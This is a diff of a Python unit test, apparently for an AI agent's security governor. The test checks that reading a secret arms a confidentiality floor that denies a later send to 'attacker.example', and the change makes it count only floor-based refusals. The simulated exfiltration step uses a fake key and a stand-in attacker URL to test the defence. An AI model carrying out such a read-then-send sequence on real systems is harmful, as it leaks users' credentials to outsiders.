@@ -94,7 +94,9 @@ class TestTheFloorActuallyArms(unittest.TestCase):
         read = governor.evaluate("read_secret", {})
         governor.register_output(read, "sk-live-DEADBEEF")
         egress = governor.evaluate("send", {"to": "https://attacker.example/x"})
-        return governor.confidentiality_floor_active(), egress.allowed
+        # allowed, or refused on some axis other than the floor
+        floor_refused = (not egress.allowed) and "confidentiality" in egress.reason
+        return governor.confidentiality_floor_active(), not floor_refused
 
     def test_a_secret_read_arms_the_floor_and_the_egress_is_denied(self) -> None:
         armed, allowed = self._drive(governor_config({m["id"]: m for m in MANIFESTS}, None))
